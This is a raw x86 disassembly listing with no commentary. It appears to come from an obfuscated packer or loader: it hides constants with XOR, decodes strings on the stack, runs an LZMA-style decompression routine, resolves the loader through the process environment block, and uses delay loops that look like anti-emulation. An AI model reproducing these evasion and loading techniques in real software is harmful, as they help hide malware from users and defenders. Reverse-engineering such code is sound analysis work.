  41cf5b:	mov    ecx,DWORD PTR [ebp-0x2c]
  41cf5e:	cmp    ecx,eax
  41cf60:	jne    0x41cf6c
  41cf62:	mov    DWORD PTR [ebp-0x8],edi
  41cf65:	mov    DWORD PTR [ebp-0x8],0xf89c85ea
  41cf6c:	mov    eax,DWORD PTR [ebp-0x4]
  41cf6f:	mov    ecx,DWORD PTR [eax+0x18c]
  41cf75:	xor    eax,eax
  41cf77:	mov    ebx,0x3272e2
  41cf7c:	cmp    DWORD PTR [ecx],eax
  41cf7e:	jne    0x41d1b6
  41cf84:	mov    ecx,DWORD PTR [ebp-0x4]
  41cf87:	mov    ecx,DWORD PTR [ecx+0x17c]
  41cf8d:	mov    DWORD PTR [ecx],eax
  41cf8f:	mov    ecx,DWORD PTR [ebp-0x4]
  41cf92:	mov    ecx,DWORD PTR [ecx+0x180]
  41cf98:	mov    DWORD PTR [ecx],eax
  41cf9a:	mov    esi,0x4e22
  41cf9f:	mov    eax,0x4f8f
  41cfa4:	mov    WORD PTR [ebp-0x78],ax
  41cfa8:	mov    eax,esi
  41cfaa:	mov    WORD PTR [ebp-0x76],ax
  41cfae:	add    eax,0x5d
  41cfb1:	mov    WORD PTR [ebp-0x74],ax
  41cfb5:	lea    eax,[esi+0x1d]
  41cfb8:	mov    WORD PTR [ebp-0x72],ax
  41cfbc:	mov    eax,0x4f92
  41cfc1:	mov    WORD PTR [ebp-0x70],ax
  41cfc5:	lea    eax,[esi+0x1c]
  41cfc8:	mov    WORD PTR [ebp-0x6e],ax
  41cfcc:	add    eax,0x3f
  41cfcf:	mov    WORD PTR [ebp-0x6c],ax
  41cfd3:	lea    eax,[esi+0x16]
  41cfd6:	mov    WORD PTR [ebp-0x6a],ax
  41cfda:	mov    eax,esi
  41cfdc:	mov    WORD PTR [ebp-0x68],ax
  41cfe0:	add    eax,0x19
  41cfe3:	mov    WORD PTR [ebp-0x66],ax
  41cfe7:	mov    eax,0x99ff
  41cfec:	mov    WORD PTR [ebp-0x64],ax
  41cff0:	mov    eax,0x828e
  41cff5:	mov    WORD PTR [ebp-0x62],ax
  41cff9:	mov    eax,0xd78d
  41cffe:	mov    WORD PTR [ebp-0x60],ax
  41d002:	add    eax,0x1c
  41d005:	mov    WORD PTR [ebp-0x5e],ax
  41d009:	mov    eax,0x27a8
  41d00e:	mov    WORD PTR [ebp-0x5c],ax
  41d012:	mov    eax,0x47a8
  41d017:	mov    WORD PTR [ebp-0x5a],ax
  41d01b:	lea    eax,[esi+0x17]
  41d01e:	push   0x8
  41d020:	mov    WORD PTR [ebp-0x58],ax
  41d024:	mov    DWORD PTR [ebp-0x10],0xb00040f
  41d02b:	mov    DWORD PTR [ebp-0xc],0x7c050c1d
  41d032:	lea    eax,[ebp-0x10]
  41d035:	pop    edi
  41d036:	mov    cl,BYTE PTR [eax]
  41d038:	xor    cl,dl
  41d03a:	sub    cl,0x8
  41d03d:	mov    BYTE PTR [eax],cl
  41d03f:	inc    eax
  41d040:	dec    edi
  41d041:	jne    0x41d036
  41d043:	lea    eax,[ebp-0x10]
  41d046:	mov    DWORD PTR [ebp-0xb8],eax
  41d04c:	lea    eax,[ebp-0xbc]
  41d052:	push   eax
  41d053:	mov    eax,DWORD PTR [ebp+0xc]
  41d056:	mov    edi,0x751089b
  41d05b:	xor    eax,edi
  41d05d:	add    eax,ebx
  41d05f:	push   eax
  41d060:	mov    eax,DWORD PTR [ebp-0x4]
  41d063:	add    eax,0x66
  41d066:	push   eax
  41d067:	mov    eax,DWORD PTR [ebp-0x4]
  41d06a:	mov    eax,DWORD PTR [eax+0x198]
  41d070:	mov    DWORD PTR [ebp-0xbc],0x1
  41d07a:	push   DWORD PTR [eax]
  41d07c:	mov    eax,DWORD PTR [ebp+0x10]
  41d07f:	call   eax
  41d081:	mov    ecx,DWORD PTR [ebp+0x8]
  41d084:	xor    ecx,edi
  41d086:	add    ecx,ebx
  41d088:	mov    DWORD PTR [ebp-0x8],eax
  41d08b:	cmp    eax,ecx
  41d08d:	jne    0x41d0a8
  41d08f:	mov    eax,ds:0x33730bee
  41d094:	or     eax,0x22150bef
  41d099:	mov    ds:0x33730bee,eax
  41d09e:	add    eax,0x3372e90f
  41d0a3:	mov    ds:0x33730bee,eax
  41d0a8:	mov    ecx,0x4f8a
  41d0ad:	mov    eax,ecx
  41d0af:	mov    WORD PTR [ebp-0x40],ax
  41d0b3:	mov    eax,0x4e71
  41d0b8:	mov    edx,eax
  41d0ba:	mov    WORD PTR [ebp-0x3e],dx
  41d0be:	lea    edx,[ecx+0xf]
  41d0c1:	mov    WORD PTR [ebp-0x3c],dx
  41d0c5:	add    edx,0xfffffff8
  41d0c8:	mov    WORD PTR [ebp-0x3a],dx
  41d0cc:	lea    edx,[ecx+0x9]
  41d0cf:	mov    WORD PTR [ebp-0x38],dx
  41d0d3:	add    edx,0x19
  41d0d6:	mov    WORD PTR [ebp-0x36],dx
  41d0da:	lea    edx,[ecx+0x1b]
  41d0dd:	mov    WORD PTR [ebp-0x34],dx
  41d0e1:	mov    WORD PTR [ebp-0x32],cx
  41d0e5:	mov    ecx,esi
  41d0e7:	mov    WORD PTR [ebp-0x30],cx
  41d0eb:	lea    ecx,[edx+0x5]
  41d0ee:	mov    edx,ecx
  41d0f0:	mov    WORD PTR [ebp-0x54],dx
  41d0f4:	mov    edx,eax
  41d0f6:	mov    WORD PTR [ebp-0x52],dx
  41d0fa:	add    edx,0x8
  41d0fd:	mov    WORD PTR [ebp-0x50],dx
  41d101:	mov    WORD PTR [ebp-0x4e],ax
  41d105:	add    eax,0x2
  41d108:	mov    WORD PTR [ebp-0x4c],ax
  41d10c:	lea    eax,[ecx-0x1e]
  41d10f:	mov    WORD PTR [ebp-0x4a],ax
  41d113:	add    eax,0xfffffff9
  41d116:	mov    WORD PTR [ebp-0x48],ax
  41d11a:	mov    WORD PTR [ebp-0x46],cx
  41d11e:	mov    WORD PTR [ebp-0x44],si
  41d122:	mov    eax,DWORD PTR [ebp+0x8]
  41d125:	movzx  ecx,WORD PTR [ebp-0x54]
  41d129:	xor    eax,edi
  41d12b:	add    eax,ebx
  41d12d:	xor    eax,ecx
  41d12f:	mov    WORD PTR [ebp-0x54],ax
  41d133:	mov    eax,DWORD PTR [ebp+0x8]
  41d136:	movzx  ecx,WORD PTR [ebp-0x40]
  41d13a:	xor    eax,edi
  41d13c:	add    eax,ebx
  41d13e:	xor    eax,ecx
  41d140:	mov    WORD PTR [ebp-0x40],ax
  41d144:	xor    eax,eax
  41d146:	mov    WORD PTR [ebp-0xd0],ax
  41d14d:	mov    WORD PTR [ebp-0xe4],ax
  41d154:	mov    edi,DWORD PTR [ebp+0x24]
  41d157:	lea    eax,[ebp-0xd0]
  41d15d:	lea    edx,[ebp-0x54]
  41d160:	mov    DWORD PTR [ebp-0xbc],0x2
  41d16a:	mov    DWORD PTR [ebp-0xb8],eax
  41d170:	call   0x41fafc
  41d175:	mov    DWORD PTR [ebp-0xb4],eax
  41d17b:	lea    eax,[ebp-0xbc]
  41d181:	push   eax
  41d182:	mov    eax,DWORD PTR [ebp+0xc]
  41d185:	xor    eax,0x751089b
  41d18a:	add    eax,ebx
  41d18c:	push   eax
  41d18d:	lea    eax,[ebp-0x78]
  41d190:	push   eax
  41d191:	push   DWORD PTR [ebp-0x8]
  41d194:	mov    eax,DWORD PTR [ebp+0x10]
  41d197:	call   eax
  41d199:	mov    edi,DWORD PTR [ebp+0x24]
  41d19c:	lea    eax,[ebp-0xe4]
  41d1a2:	lea    edx,[ebp-0x40]
  41d1a5:	mov    DWORD PTR [ebp-0xb8],eax
  41d1ab:	call   0x41fafc
  41d1b0:	mov    DWORD PTR [ebp-0xb4],eax
  41d1b6:	mov    eax,DWORD PTR [ebp+0x14]
  41d1b9:	push   DWORD PTR [ebp-0x4]
  41d1bc:	push   DWORD PTR [ebp+0x20]
  41d1bf:	push   DWORD PTR [ebp+0x1c]
  41d1c2:	push   DWORD PTR [ebp+0x18]
  41d1c5:	push   DWORD PTR [ebp+0x10]
  41d1c8:	push   DWORD PTR [ebp+0x8]
  41d1cb:	push   DWORD PTR [ebp+0xc]
  41d1ce:	call   0x41e378
  41d1d3:	test   eax,eax
  41d1d5:	je     0x41d21c
  41d1d7:	add    DWORD PTR [ebp-0x4],eax
  41d1da:	push   DWORD PTR [ebp-0x4]
  41d1dd:	lea    esi,[ebp+0x4]
  41d1e0:	call   0x41d60c
  41d1e5:	mov    eax,DWORD PTR [ebp-0x4]
  41d1e8:	mov    eax,DWORD PTR [eax+0x1c8]
  41d1ee:	mov    eax,DWORD PTR [eax]
  41d1f0:	xor    eax,0x751089b
  41d1f5:	add    eax,ebx
  41d1f7:	mov    eax,DWORD PTR [ebp-0x4]
  41d1fa:	jne    0x41d212
  41d1fc:	mov    ecx,DWORD PTR [ebp-0x4]
  41d1ff:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41d205:	push   DWORD PTR [ecx]
  41d207:	mov    eax,DWORD PTR [eax+0x1d8]
  41d20d:	call   DWORD PTR [eax+0x28]
  41d210:	jmp    0x41d21c
  41d212:	mov    eax,DWORD PTR [eax+0x17c]
  41d218:	mov    eax,DWORD PTR [eax]
  41d21a:	add    DWORD PTR [esi],eax
  41d21c:	pop    esi
  41d21d:	pop    edi
  41d21e:	pop    ebx
  41d21f:	leave  
  41d220:	ret    0x20
  41d223:	push   edi
  41d224:	push   esi
  41d225:	push   ebx
  41d226:	push   ebp
  41d227:	mov    ebp,esp
  41d229:	mov    eax,DWORD PTR [ebp+0x24]
  41d22c:	add    DWORD PTR [ebp+0x28],eax
  41d22f:	push   eax
  41d230:	cld    
  41d231:	mov    esi,DWORD PTR [ebp+0x18]
  41d234:	add    DWORD PTR [ebp+0x1c],esi
  41d237:	push   esi
  41d238:	mov    esi,DWORD PTR [ebp+0x14]
  41d23b:	lods   eax,DWORD PTR ds:[esi]
  41d23c:	xchg   edx,eax
  41d23d:	push   edx
  41d23e:	mov    cl,BYTE PTR [esi-0x2]
  41d241:	or     eax,0xffffffff
  41d244:	shl    eax,cl
  41d246:	not    eax
  41d248:	push   eax
  41d249:	mov    cl,dh
  41d24b:	or     eax,0xffffffff
  41d24e:	shl    eax,cl
  41d250:	not    eax
  41d252:	push   eax
  41d253:	add    cl,dl
  41d255:	mov    edi,esi
  41d257:	sub    esp,0xc
  41d25a:	sub    eax,eax
  41d25c:	inc    eax
  41d25d:	push   eax
  41d25e:	push   eax
  41d25f:	push   eax
  41d260:	push   eax
  41d261:	push   eax
  41d262:	push   edi
  41d263:	sub    esi,esi
  41d265:	push   esi
  41d266:	or     ebx,0xffffffff
  41d269:	mov    eax,0x300
  41d26e:	shl    eax,cl
  41d270:	lea    ecx,[eax+0x736]
  41d276:	mov    eax,0x4000400
  41d27b:	shr    ecx,1
  41d27d:	rep stos DWORD PTR es:[edi],eax
  41d27f:	push   0x5
  41d281:	pop    ecx
  41d282:	call   0x41d56d
  41d287:	loop   0x41d282
  41d289:	lea    esi,[esi]
  41d28b:	lea    edi,[edi]
  41d28d:	mov    edi,DWORD PTR [ebp-0x4]
  41d290:	mov    eax,DWORD PTR [ebp-0x10]
  41d293:	sub    edi,DWORD PTR [ebp+0x24]
  41d296:	and    eax,edi
  41d298:	mov    DWORD PTR [ebp-0x18],eax
  41d29b:	mov    al,0x0
  41d29d:	call   0x41d585
  41d2a2:	jne    0x41d33d
  41d2a8:	mov    cl,BYTE PTR [ebp-0xc]
  41d2ab:	and    edi,DWORD PTR [ebp-0x14]
  41d2ae:	shl    edi,cl
  41d2b0:	sub    cl,0x8
  41d2b3:	neg    cl
  41d2b5:	shr    esi,cl
  41d2b7:	pop    eax
  41d2b8:	add    edi,esi
  41d2ba:	pop    esi
  41d2bb:	lea    edi,[edi+edi*2]
  41d2be:	shl    edi,0x8
  41d2c1:	cmp    al,0x7
  41d2c3:	pop    edx
  41d2c4:	lea    ecx,[esi+edi*2+0xe6c]
  41d2cb:	push   ecx
  41d2cc:	push   esi
  41d2cd:	mov    esi,0x100
  41d2d2:	push   eax
  41d2d3:	mov    al,0x1
  41d2d5:	jb     0x41d30b
  41d2d7:	mov    edi,DWORD PTR [ebp-0x4]
  41d2da:	sub    edi,DWORD PTR [ebp-0x24]
  41d2dd:	movzx  edi,BYTE PTR [edi]
  41d2e0:	mov    ebp,DWORD PTR [ebp-0x34]
  41d2e3:	shl    edi,1
  41d2e5:	mov    ecx,esi
  41d2e7:	and    esi,edi
  41d2e9:	add    ecx,esi
  41d2eb:	lea    ebp,[ebp+ecx*2+0x0]
  41d2ef:	call   0x41d5a4
  41d2f4:	mov    ecx,eax
  41d2f6:	shr    esi,0x8
  41d2f9:	and    ecx,0x1
  41d2fc:	cmp    esi,ecx
  41d2fe:	mov    esi,0x100
  41d303:	jne    0x41d313
  41d305:	cmp    eax,esi
  41d307:	jb     0x41d2e0
  41d309:	jmp    0x41d31f
  41d30b:	mov    ebp,DWORD PTR [ebp-0x34]
  41d30e:	call   0x41d5a4
  41d313:	inc    eax
  41d314:	inc    esi
  41d315:	sub    eax,0x1
  41d318:	sub    esi,0x1
  41d31b:	cmp    eax,esi
  41d31d:	jb     0x41d30b
  41d31f:	pop    edx
  41d320:	inc    edx
  41d321:	cmp    edx,0x5
  41d324:	dec    edx
  41d325:	mov    ecx,edx
  41d327:	jb     0x41d338
  41d329:	inc    edx
  41d32a:	cmp    edx,0xb
  41d32d:	dec    edx
  41d32e:	mov    cl,0x4
  41d330:	dec    cl
  41d332:	jb     0x41d338
  41d334:	mov    cl,0x7
  41d336:	dec    cl
  41d338:	sub    edx,ecx
  41d33a:	push   edx
  41d33b:	jmp    0x41d38c
  41d33d:	mov    al,0xc1
  41d33f:	dec    al
  41d341:	call   0x41d595
  41d346:	jne    0x41d35c
  41d348:	pop    eax
  41d349:	pop    edi
  41d34a:	pop    edx
  41d34b:	pop    ecx
  41d34c:	pop    edx
  41d34d:	pop    ecx
  41d34e:	push   DWORD PTR [esp]
  41d351:	push   ecx
  41d352:	push   edx
  41d353:	mov    edx,0x664
  41d358:	mov    cl,0x0
  41d35a:	jmp    0x41d3cf
  41d35c:	mov    al,0xcd
  41d35e:	dec    al
  41d360:	call   0x41d595
  41d365:	jne    0x41d395
  41d367:	mov    al,0xf1
  41d369:	dec    al
  41d36b:	call   0x41d585
  41d370:	jne    0x41d3c5
  41d372:	pop    eax
  41d373:	cmp    al,0x7
  41d375:	mov    al,0x9
  41d377:	jb     0x41d37b
  41d379:	mov    al,0xb
  41d37b:	push   eax
  41d37c:	mov    esi,DWORD PTR [ebp-0x4]
  41d37f:	sub    esi,DWORD PTR [ebp-0x24]
  41d382:	cmp    esi,DWORD PTR [ebp+0x24]
  41d385:	jb     0x41d55c
  41d38b:	lods   al,BYTE PTR ds:[esi]
  41d38c:	mov    edi,DWORD PTR [ebp-0x4]
  41d38f:	stos   BYTE PTR es:[edi],al
  41d390:	jmp    0x41d523
  41d395:	mov    al,0xd8
  41d397:	call   0x41d595
  41d39c:	mov    esi,DWORD PTR [ebp-0x28]
  41d39f:	je     0x41d3bc
  41d3a1:	mov    al,0xe4
  41d3a3:	call   0x41d595
  41d3a8:	mov    esi,DWORD PTR [ebp-0x2c]
  41d3ab:	je     0x41d3b6
  41d3ad:	mov    esi,DWORD PTR [ebp-0x30]
  41d3b0:	mov    ecx,DWORD PTR [ebp-0x2c]
  41d3b3:	mov    DWORD PTR [ebp-0x30],ecx
  41d3b6:	mov    ecx,DWORD PTR [ebp-0x28]
  41d3b9:	mov    DWORD PTR [ebp-0x2c],ecx
  41d3bc:	mov    ecx,DWORD PTR [ebp-0x24]
  41d3bf:	mov    DWORD PTR [ebp-0x28],ecx
  41d3c2:	mov    DWORD PTR [ebp-0x24],esi
  41d3c5:	pop    eax
  41d3c6:	pop    edi
  41d3c7:	pop    ecx
  41d3c8:	mov    edx,0xa68
  41d3cd:	mov    cl,0x8
  41d3cf:	add    edx,edi
  41d3d1:	push   edx
  41d3d2:	push   edi
  41d3d3:	cmp    al,0x7
  41d3d5:	mov    al,cl
  41d3d7:	jb     0x41d3db
  41d3d9:	add    al,0x3
  41d3db:	push   eax
  41d3dc:	mov    ebp,DWORD PTR [ebp-0x34]
  41d3df:	call   0x41d5a2
  41d3e4:	jne    0x41d3fa
  41d3e6:	mov    eax,DWORD PTR [ebp-0x18]
  41d3e9:	mov    edi,DWORD PTR [ebp-0x34]
  41d3ec:	shl    eax,0x3
  41d3ef:	sub    ecx,ecx
  41d3f1:	push   0x8
  41d3f3:	pop    esi
  41d3f4:	lea    edi,[edi+eax*2+0x4]
  41d3f8:	jmp    0x41d42f
  41d3fa:	mov    ebp,DWORD PTR [ebp-0x34]
  41d3fd:	add    ebp,0x2
  41d400:	call   0x41d5a2
  41d405:	jne    0x41d41f
  41d407:	mov    eax,DWORD PTR [ebp-0x18]
  41d40a:	mov    edi,DWORD PTR [ebp-0x34]
  41d40d:	shl    eax,0x3
  41d410:	push   0x8
  41d412:	pop    ecx
  41d413:	push   0x8
  41d415:	pop    esi
  41d416:	lea    edi,[edi+eax*2+0x104]
  41d41d:	jmp    0x41d42f
  41d41f:	mov    edi,0x204
  41d424:	add    edi,DWORD PTR [ebp-0x34]
  41d427:	push   0x10
  41d429:	pop    ecx
  41d42a:	mov    esi,0x100
  41d42f:	mov    DWORD PTR [ebp-0x1c],ecx
  41d432:	sub    eax,eax
  41d434:	inc    eax
  41d435:	mov    ebp,edi
  41d437:	call   0x41d5a4
  41d43c:	mov    ecx,eax
  41d43e:	sub    ecx,esi
  41d440:	jb     0x41d435
  41d442:	add    DWORD PTR [ebp-0x1c],ecx
  41d445:	cmp    DWORD PTR [ebp-0x3c],0x4
  41d449:	jae    0x41d4ff
  41d44f:	add    DWORD PTR [ebp-0x3c],0x7
  41d453:	mov    ecx,DWORD PTR [ebp-0x1c]
  41d456:	cmp    ecx,0x4
  41d459:	jb     0x41d45e
  41d45b:	push   0x3
  41d45d:	pop    ecx
  41d45e:	mov    edi,DWORD PTR [ebp-0x38]
  41d461:	shl    ecx,0x6
  41d464:	sub    eax,eax
  41d466:	inc    eax
  41d467:	push   0x40
  41d469:	pop    esi
  41d46a:	lea    edi,[edi+ecx*2+0x360]
  41d471:	mov    ebp,edi
  41d473:	call   0x41d5a4
  41d478:	mov    ecx,eax
  41d47a:	sub    ecx,esi
  41d47c:	jb     0x41d471
  41d47e:	mov    DWORD PTR [ebp-0x18],ecx
  41d481:	mov    DWORD PTR [ebp-0x24],ecx
  41d484:	cmp    ecx,0x4
  41d487:	jb     0x41d4fc
  41d489:	mov    esi,ecx
  41d48b:	and    DWORD PTR [ebp-0x24],0x1
  41d48f:	shr    esi,1
  41d491:	or     DWORD PTR [ebp-0x24],0x2
  41d495:	dec    esi
  41d496:	cmp    ecx,0xe
  41d499:	jae    0x41d4b4
  41d49b:	mov    eax,0x2af
  41d4a0:	sub    eax,ecx
  41d4a2:	mov    ecx,esi
  41d4a4:	shl    BYTE PTR [ebp-0x24],cl
  41d4a7:	add    eax,DWORD PTR [ebp-0x24]
  41d4aa:	shl    eax,1
  41d4ac:	add    eax,DWORD PTR [ebp-0x38]
  41d4af:	mov    DWORD PTR [ebp-0x34],eax
  41d4b2:	jmp    0x41d4e1
  41d4b4:	sub    esi,0x4
  41d4b7:	call   0x41d561
  41d4bc:	shr    ebx,1
  41d4be:	shl    DWORD PTR [ebp-0x24],1
  41d4c1:	cmp    DWORD PTR [ebp-0x20],ebx
  41d4c4:	jb     0x41d4cc
  41d4c6:	inc    DWORD PTR [ebp-0x24]
  41d4c9:	sub    DWORD PTR [ebp-0x20],ebx
  41d4cc:	dec    esi
  41d4cd:	jne    0x41d4b7
  41d4cf:	mov    eax,0x644
  41d4d4:	add    eax,DWORD PTR [ebp-0x38]
  41d4d7:	mov    DWORD PTR [ebp-0x34],eax
  41d4da:	shl    DWORD PTR [ebp-0x24],0x4
  41d4de:	push   0x4
  41d4e0:	pop    esi
  41d4e1:	sub    edi,edi
  41d4e3:	inc    edi
  41d4e4:	mov    eax,edi
  41d4e6:	mov    ebp,DWORD PTR [ebp-0x34]
  41d4e9:	call   0x41d5a4
  41d4ee:	test   al,0x1
  41d4f0:	je     0x41d4f5
  41d4f2:	or     DWORD PTR [ebp-0x24],edi
  41d4f5:	shl    edi,1
  41d4f7:	dec    esi
  41d4f8:	jne    0x41d4e6
  41d4fa:	jmp    0x41d4fc
  41d4fc:	inc    DWORD PTR [ebp-0x24]
  41d4ff:	mov    ecx,DWORD PTR [ebp-0x1c]
  41d502:	add    ecx,0x2
  41d505:	mov    edi,DWORD PTR [ebp-0x4]
  41d508:	mov    eax,edi
  41d50a:	sub    eax,DWORD PTR [ebp+0x24]
  41d50d:	cmp    DWORD PTR [ebp-0x24],eax
  41d510:	ja     0x41d55c
  41d512:	mov    esi,edi
  41d514:	sub    esi,DWORD PTR [ebp-0x24]
  41d517:	mov    edx,DWORD PTR [ebp+0x28]
  41d51a:	lods   al,BYTE PTR ds:[esi]
  41d51b:	stos   BYTE PTR es:[edi],al
  41d51c:	cmp    edi,edx
  41d51e:	jae    0x41d523
  41d520:	dec    ecx
  41d521:	jne    0x41d51a
  41d523:	mov    DWORD PTR [ebp-0x4],edi
  41d526:	movzx  esi,al
  41d529:	cmp    edi,DWORD PTR [ebp+0x28]
  41d52c:	jb     0x41d28d
  41d532:	call   0x41d561
  41d537:	sub    eax,eax
  41d539:	lea    ebp,[esp+0x3c]
  41d53d:	mov    edx,DWORD PTR [ebp+0x20]
  41d540:	mov    esi,DWORD PTR [ebp-0x8]
  41d543:	sub    esi,DWORD PTR [ebp+0x18]
  41d546:	mov    DWORD PTR [edx],esi
  41d548:	mov    edx,DWORD PTR [ebp+0x2c]
  41d54b:	mov    edi,DWORD PTR [ebp-0x4]
  41d54e:	sub    edi,DWORD PTR [ebp+0x24]
  41d551:	mov    DWORD PTR [edx],edi
  41d553:	leave  
  41d554:	pop    ebx
  41d555:	pop    esi
  41d556:	pop    edi
  41d557:	ret    0x1c
  41d55a:	pop    esi
  41d55b:	pop    eax
  41d55c:	sub    eax,eax
  41d55e:	inc    eax
  41d55f:	jmp    0x41d539
  41d561:	cmp    ebx,0x1000000
  41d567:	jb     0x41d56a
  41d569:	ret    
  41d56a:	shl    ebx,0x8
  41d56d:	push   esi
  41d56e:	mov    esi,DWORD PTR [ebp-0x8]
  41d571:	cmp    esi,DWORD PTR [ebp+0x1c]
  41d574:	jae    0x41d55a
  41d576:	mov    eax,DWORD PTR [ebp-0x20]
  41d579:	shl    eax,0x8
  41d57c:	lods   al,BYTE PTR ds:[esi]
  41d57d:	mov    DWORD PTR [ebp-0x20],eax
  41d580:	mov    DWORD PTR [ebp-0x8],esi
  41d583:	pop    esi
  41d584:	ret    
  41d585:	mov    ecx,DWORD PTR [ebp-0x3c]
  41d588:	movzx  eax,al
  41d58b:	shl    ecx,0x4
  41d58e:	add    eax,DWORD PTR [ebp-0x18]
  41d591:	add    eax,ecx
  41d593:	jmp    0x41d59b
  41d595:	movzx  eax,al
  41d598:	add    eax,DWORD PTR [ebp-0x3c]
  41d59b:	mov    ebp,DWORD PTR [ebp-0x38]
  41d59e:	lea    ebp,[ebp+eax*2+0x0]
  41d5a2:	sub    eax,eax
  41d5a4:	lea    ebp,[ebp+eax*2+0x0]
  41d5a8:	cmp    ebx,0x1000000
  41d5ae:	jae    0x41d5cc
  41d5b0:	mov    ecx,DWORD PTR [esp+0x38]
  41d5b4:	shl    DWORD PTR [esp+0x20],0x8
  41d5b9:	cmp    ecx,DWORD PTR [esp+0x5c]
  41d5bd:	jae    0x41d55b
  41d5bf:	mov    dl,BYTE PTR [ecx]
  41d5c1:	inc    DWORD PTR [esp+0x38]
  41d5c5:	shl    ebx,0x8
  41d5c8:	mov    BYTE PTR [esp+0x20],dl
  41d5cc:	mov    ecx,ebx
  41d5ce:	movzx  edx,WORD PTR [ebp+0x0]
  41d5d2:	shr    ecx,0xb
  41d5d5:	imul   ecx,edx
  41d5d8:	cmp    DWORD PTR [esp+0x20],ecx
  41d5dc:	jae    0x41d5f5
  41d5de:	mov    ebx,ecx
  41d5e0:	mov    ecx,0x800
  41d5e5:	sub    ecx,edx
  41d5e7:	shr    ecx,0x5
  41d5ea:	add    WORD PTR [ebp+0x0],cx
  41d5ee:	add    eax,eax
  41d5f0:	lea    ebp,[esp+0x40]
  41d5f4:	ret    
  41d5f5:	shr    edx,0x5
  41d5f8:	sub    DWORD PTR [esp+0x20],ecx
  41d5fc:	sub    ebx,ecx
  41d5fe:	sub    WORD PTR [ebp+0x0],dx
  41d602:	add    eax,eax
  41d604:	add    eax,0x1
  41d607:	lea    ebp,[esp+0x40]
  41d60b:	ret    
  41d60c:	push   ebp
  41d60d:	mov    ebp,esp
  41d60f:	sub    esp,0x104
  41d615:	push   ebx
  41d616:	push   esi
  41d617:	push   edi
  41d618:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  41d61f:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  41d626:	mov    eax,DWORD PTR [ebp+0x8]
  41d629:	mov    DWORD PTR [ebp+0x8],eax
  41d62c:	mov    ecx,DWORD PTR [ebp-0x14]
  41d62f:	mov    ebx,0x751089b
  41d634:	xor    ecx,ebx
  41d636:	mov    eax,0x3272e2
  41d63b:	add    ecx,eax
  41d63d:	mov    DWORD PTR [ebp-0x2c],ecx
  41d640:	mov    ecx,DWORD PTR [ebp-0x14]
  41d643:	xor    ecx,ebx
  41d645:	add    ecx,eax
  41d647:	mov    DWORD PTR [ebp-0x3c],ecx
  41d64a:	mov    ecx,DWORD PTR [ebp-0x14]
  41d64d:	xor    ecx,ebx
  41d64f:	add    ecx,eax
  41d651:	mov    DWORD PTR [ebp-0x40],ecx
  41d654:	mov    ecx,DWORD PTR [ebp-0x14]
  41d657:	xor    ecx,ebx
  41d659:	add    ecx,eax
  41d65b:	mov    DWORD PTR [ebp-0xa0],ecx
  41d661:	mov    DWORD PTR [ebp-0x50],0xf89f0585
  41d668:	mov    DWORD PTR [ebp-0x40],0xf89cb585
  41d66f:	mov    DWORD PTR [ebp-0x4c],0xf89c85b9
  41d676:	push   0x25
  41d678:	pop    ecx
  41d679:	mov    DWORD PTR [ebp-0x34],ecx
  41d67c:	mov    DWORD PTR [ebp-0x34],ecx
  41d67f:	push   0x65
  41d681:	pop    ecx
  41d682:	mov    DWORD PTR [ebp-0x34],ecx
  41d685:	mov    DWORD PTR [ebp-0x34],ecx
  41d688:	mov    DWORD PTR [ebp-0x34],0x4d
  41d68f:	mov    DWORD PTR [ebp-0x34],0x43
  41d696:	mov    ecx,DWORD PTR [ebp-0x14]
  41d699:	xor    ecx,ebx
  41d69b:	add    ecx,eax
  41d69d:	mov    DWORD PTR [ebp-0x34],ecx
  41d6a0:	mov    ecx,DWORD PTR [ebp-0x14]
  41d6a3:	xor    ecx,ebx
  41d6a5:	add    ecx,eax
  41d6a7:	mov    DWORD PTR [ebp-0x34],ecx
  41d6aa:	mov    DWORD PTR [ebp-0x28],0x257
  41d6b1:	mov    DWORD PTR [ebp-0x20],0x35
  41d6b8:	mov    DWORD PTR [ebp-0x10],0x79
  41d6bf:	lea    edi,[ebp-0xe4]
  41d6c5:	lea    esi,[ebp-0x104]
  41d6cb:	call   0x41e2e7
  41d6d0:	dec    DWORD PTR [ebp-0x10]
  41d6d3:	jne    0x41d6bf
  41d6d5:	dec    DWORD PTR [ebp-0x20]
  41d6d8:	jne    0x41d6b8
  41d6da:	dec    DWORD PTR [ebp-0x28]
  41d6dd:	jne    0x41d6b1
  41d6df:	mov    DWORD PTR [ebp-0x28],0x400d
  41d6e6:	mov    eax,DWORD PTR [ebp-0x14]
  41d6e9:	xor    eax,ebx
  41d6eb:	mov    esi,0x3272e2
  41d6f0:	add    eax,esi
  41d6f2:	mov    DWORD PTR [ebp-0x8],eax
  41d6f5:	mov    eax,DWORD PTR [ebp-0x14]
  41d6f8:	and    DWORD PTR [ebp-0x94],0x0
  41d6ff:	xor    eax,ebx
  41d701:	add    eax,esi
  41d703:	mov    DWORD PTR [ebp-0x38],eax
  41d706:	mov    eax,fs:0x18
  41d70c:	mov    DWORD PTR [ebp-0x94],eax
  41d712:	mov    eax,DWORD PTR [eax+0x30]
  41d715:	mov    DWORD PTR [ebp-0x98],eax
  41d71b:	mov    eax,DWORD PTR [eax+0xc]
  41d71e:	mov    DWORD PTR [ebp-0xc0],eax
  41d724:	mov    eax,DWORD PTR [ebp+0x8]
  41d727:	lea    ecx,[ebp-0x94]
  41d72d:	mov    DWORD PTR [eax+0x1a0],ecx
  41d733:	mov    eax,DWORD PTR [ebp+0x8]
  41d736:	lea    ecx,[ebp-0x98]
  41d73c:	mov    DWORD PTR [eax+0x1a4],ecx
  41d742:	mov    eax,DWORD PTR [ebp+0x8]
  41d745:	push   DWORD PTR [ebp+0x8]
  41d748:	lea    ecx,[ebp-0xc0]
  41d74e:	mov    DWORD PTR [eax+0x1a8],ecx
  41d754:	call   0x41facd
  41d759:	mov    ecx,DWORD PTR [ebp-0x14]
  41d75c:	xor    ecx,ebx
  41d75e:	add    ecx,esi
  41d760:	cmp    ecx,eax
  41d762:	je     0x41da3f
  41d768:	mov    eax,DWORD PTR [ebp+0x8]
  41d76b:	mov    eax,DWORD PTR [eax+0x194]
  41d771:	mov    ecx,DWORD PTR [eax]
  41d773:	mov    eax,DWORD PTR [ebp+0x8]
  41d776:	mov    eax,DWORD PTR [eax+0x194]
  41d77c:	mov    eax,DWORD PTR [eax]
  41d77e:	add    eax,DWORD PTR [ecx+0x3c]
  41d781:	mov    ecx,DWORD PTR [ebp+0x8]
  41d784:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41d78a:	lea    edx,[ebp-0xc4]
